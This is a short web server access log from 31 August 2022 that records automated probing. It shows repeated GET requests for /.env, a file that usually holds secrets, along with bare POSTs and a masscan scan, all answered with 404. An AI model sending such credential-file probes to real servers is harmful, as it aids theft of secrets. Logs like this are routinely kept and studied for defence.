::ffff:127.0.0.1 - - [31/Aug/2022:21:38:11 +0000] "GET /home HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
::1 - - [31/Aug/2022:22:19:26 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:22:19:27 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:22:49:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:22:49:46 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:23:05:41 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:23:05:42 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:23:15:11 +0000] "GET / HTTP/1.0" 404 139 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
